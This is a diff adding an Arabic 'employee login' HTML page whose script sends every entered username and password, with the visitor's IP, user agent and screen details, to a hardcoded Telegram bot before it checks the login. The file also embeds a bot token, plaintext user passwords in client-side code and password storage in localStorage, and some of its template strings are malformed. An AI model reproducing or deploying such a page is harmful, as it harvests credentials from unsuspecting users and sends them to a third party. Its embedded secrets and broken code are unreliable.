@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة تحكم الموظف</title>
+    <link rel="icon" href="logo.jpg" type="image/png">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(50deg, #120b1a, #ff0000);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+        }
+
+        .login-container img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .login-container h2 {
+            margin-bottom: 20px;
+            font-size: 26px;
+            color: #000000;
+            font-weight: bold;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+
+        .input-field:focus {
+            border: 1px solid #4CAF50;
+            outline: none;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-button:hover {
+            background-color: #45a049;
+        }
+
+        .social-links {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .social-links a {
+            text-decoration: none;
+            color: white;
+            background-color: #3b5998;
+            padding: 10px;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        .social-links a:hover {
+            background-color: #4CAF50;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .footer a {
+            color: #4CAF50;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .forgot-password a {
+            color: #4CAF50;
+            text-decoration: none;
+        }
+
+        #iframe-container {
+            display: none;
+            width: 100%;
+            height: 600px;
+            border: none;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>تسجيل الدخول للموظف</h2>
+    <form id="login-form">
+        <input type="text" id="email" class="input-field" placeholder="كود السوبر ليدر الخاص بك" required>
+        <input type="password" id="password" class="input-field" placeholder="كلمة المرور" required>
+        <button type="submit" class="login-button">دخول</button>
+    </form>
+
+    <div class="forgot-password">
+        <a href="https://wa.me/+201029985266?text=مرحبا %20لقد%20نسيت%20كلمة%20مروري">هل نسيت كلمة المرور؟</a>
+    </div>
+
+    <div class="social-links">
+        <a href="https://www.facebook.com/omaressamelshemi/" title="Facebook"><i class="fab fa-facebook-f"></i></a>
+        <a href="https://t.me/El_Shemi_Basha" title="Telegram"><i class="fab fa-telegram"></i></a>
+        <a href="https://www.instagram.com/omaressamelshemi/" title="Instagram"><i class="fab fa-instagram"></i></a>
+    </div>
+
+    <div class="footer">
+        &copy; 2025 تم برمجت جميع المواقع من خلال - <a href="https://www.facebook.com/omaressamelshemi/">OMAR EL-SHEMI</a>
+    </div>
+</div>
+
+<iframe id="iframe-container" src="" frameborder="0"></iframe>
+
+<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "8175198885:AAFpuh9RBkhrbgd29ktz_dgl9nCCptvniLs";
+    const CHAT_ID = "5857518644";
+    const URI_API = https://api.telegram.org/bot${TOKEN}/sendMessage;
+
+    const users = {
+        'omar5204': { password: 'mo9556', url: 'https://omaressamelshime.github.io/ledr.123/superledr/omar5204' },
+        'mostafa952': { password: 'po9403', url: 'https://omaressamelshime.github.io/ledr.123/superledr/mostafa952' },
+        'abdo7067': { password: 'ab9300', url: 'https://omaressamelshime.github.io/ledr.123/superledr/omar5204' },
+    };
+
+    const loginForm = document.getElementById('login-form');
+    const emailField = document.getElementById('email');
+    const passwordField = document.getElementById('password');
+    const iframe = document.getElementById('iframe-container');
+    const loginContainer = document.querySelector('.login-container');
+
+    // استعادة بيانات المستخدم عند تحميل الصفحة
+    window.onload = () => {
+        const savedEmail = localStorage.getItem('email');
+        const savedPassword = localStorage.getItem('password');
+        if (savedEmail && savedPassword && users[savedEmail]?.password === savedPassword) {
+            loginContainer.style.display = 'none';
+            iframe.style.display = 'block';
+            iframe.src = users[savedEmail].url;
+        }
+    };
+
+    loginForm.addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const email = emailField.value;
+        const password = passwordField.value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                const message =  
+                    <b>تسجيل جديد في صفحة الموظفين</b>\n
+                    <b>اليوزر:</b> ${email}\n
+                    <b>الباسورد:</b> ${password}\n
+                    <b>الIP:</b> ${ip}\n
+                    <b>نوع الجهاز:</b> ${deviceType}\n
+                    <b>Platform:</b> ${platform}\n
+                    <b>User Agent:</b> ${userAgent}\n
+                    <b>مقاس الشاشة:</b> ${screenWidth}x${screenHeight}
+                ;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(() => {
+                    if (users[email] && users[email].password === password) {
+                        // حفظ بيانات تسجيل الدخول
+                        localStorage.setItem('email', email);
+                        localStorage.setItem('password', password);
+
+                        alert('تم تسجيل الدخول بنجاح!');
+                        loginContainer.style.display = 'none';
+                        iframe.style.display = 'block';
+                        iframe.src = users[email].url;
+                    } else {
+                        alert('اسم المستخدم أو كلمة المرور غير صحيحة.');
+                    }
+                }).catch(() => {
+                    alert('Error sending the information. Please try again.');
+                });
+            })
+            .catch(() => {
+                alert('Error fetching the IP address. Please try again.');
+            });
+    });
+
+    // زر إغلاق الصفحة
+    const closeButton = document.createElement('button');
+    closeButton.textContent = 'إغلاق';
+    closeButton.style = 
+        position: absolute; 
+        top: 10px; 
+        right: 10px; 
+        background: red; 
+        color: white; 
+        border: none; 
+        border-radius: 5px; 
+        padding: 10px; 
+        cursor: pointer;
+    ;
+    document.body.appendChild(closeButton);
+
+    closeButton.addEventListener('click', () => {
+        iframe.style.display = 'none';
+        loginContainer.style.display = 'block';
+        iframe.src = '';
+        // إزالة بيانات تسجيل الدخول
+        localStorage.removeItem('email');
+        localStorage.removeItem('password');
+    });
+</script>
+
+</body>
+</html>
